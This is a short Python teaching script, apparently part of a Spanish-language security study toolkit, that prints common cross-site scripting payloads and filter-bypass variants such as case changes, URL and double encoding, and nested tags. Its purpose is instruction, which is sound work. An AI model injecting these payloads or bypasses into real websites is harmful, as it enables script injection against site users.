
#!/usr/bin/env python3
"""
XSS Training Script
Desarrollado por @descambiado para BOFA Study Mode
"""

import time
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                        XSS TRAINER                              ║
║                    Modo Estudio - BOFA                          ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def xss_payloads_demo():
    print(f"{Fore.YELLOW}📚 Payloads de XSS Comunes{Style.RESET_ALL}")
    
    payloads = [
        ("<script>alert('XSS')</script>", "XSS básico"),
        ("<img src=x onerror=alert('XSS')>", "Event handler"),
        ("<svg onload=alert('XSS')>", "SVG XSS"),
        ("javascript:alert('XSS')", "JavaScript protocol"),
        ("'><script>alert('XSS')</script>", "Attribute escape")
    ]
    
    for i, (payload, desc) in enumerate(payloads, 1):
        print(f"{Fore.GREEN}[{i}]{Fore.WHITE} {desc}")
        print(f"    Payload: {Fore.CYAN}{payload}{Style.RESET_ALL}")
        time.sleep(2)

def filter_bypass_techniques():
    print(f"\n{Fore.YELLOW}🔓 Técnicas de Bypass{Style.RESET_ALL}")
    
    bypasses = [
        ("Case variation", "<ScRiPt>alert('XSS')</ScRiPt>"),
        ("Encoding", "%3Cscript%3Ealert('XSS')%3C/script%3E"),
        ("Double encoding", "%253Cscript%253E"),
        ("Character insertion", "<sc<script>ript>alert('XSS')</script>"),
        ("Alternative tags", "<img src=x onerror=alert('XSS')>")
    ]
    
    for technique, example in bypasses:
        print(f"{Fore.GREEN}• {technique}:{Fore.WHITE} {example}{Style.RESET_ALL}")
        time.sleep(1.5)

def main():
    print_banner()
    print(f"{Fore.CYAN}🎓 Iniciando entrenamiento de XSS...{Style.RESET_ALL}")
    
    xss_payloads_demo()
    filter_bypass_techniques()
    
    print(f"\n{Fore.CYAN}🎉 ¡Entrenamiento completado!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📈 Has ganado 80 puntos de estudio{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
